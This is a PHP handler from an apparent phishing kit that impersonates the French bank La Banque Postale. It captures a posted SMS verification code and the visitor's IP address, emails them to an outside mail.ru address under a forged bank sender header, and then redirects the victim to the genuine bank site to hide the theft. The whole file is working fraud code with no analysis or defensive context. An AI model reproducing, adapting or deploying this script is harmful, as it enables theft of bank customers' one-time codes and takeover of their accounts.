<?php
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
if(($_POST['sm'] != "")  )
{
$hostname = gethostbyaddr($ip);
$message .= "=================================================================\n";
$message .= "SMS       : ".$_POST['sm']."\n";
$message .= "=================================================================\n";
$send = "raybanemsi@mail.ru";
$subject = "SMS | Postale [$ip] ";
$headers = "From: La Banque Postale<localhost>";
mail($send,$subject,$message,$headers);
echo "<meta http-equiv='refresh' content='0; url=https://www.labanquepostale.fr/particuliers/au_quotidien.html'/>";
}
	else {
     echo "<meta http-equiv='refresh' content='0; url=https://www.labanquepostale.fr/particuliers/au_quotidien.html' />";
}

?>